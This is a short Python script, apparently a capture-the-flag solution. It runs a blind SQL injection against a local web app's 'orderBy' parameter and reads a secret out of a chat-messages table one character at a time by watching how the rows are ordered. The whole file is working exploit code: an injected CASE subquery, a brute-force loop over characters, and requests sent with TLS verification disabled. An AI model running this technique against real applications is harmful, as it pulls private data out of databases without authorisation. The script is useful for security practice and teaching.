import requests
import requests.packages
import string

requests.packages.urllib3.disable_warnings()

HOST = "http://localhost:5000/users"
ALPHABET = string.ascii_letters + string.digits + "{" + "}" + "_"

flag = ""
iterator = 1
for _ in range(100):
    for letter in ALPHABET:
        order = f"(case when (select SUBSTR(Value, {iterator}, 1) from ChatMessages inner join Chats on ChatId = Chats.Id where Name like '%secret%') = '{letter}' then age end) asc, age desc"
        params = {
            "orderBy": order
        }

        response = requests.get(HOST, params=params, verify=False)
        if response.ok:
            ages = [user['age'] for user in response.json()]
            i = 0

            while ages[i] == ages[i+1]:
                i += 1
            
            if (ages[i] < ages[i + 1]):
                flag += letter
                iterator += 1
                print(flag)
                break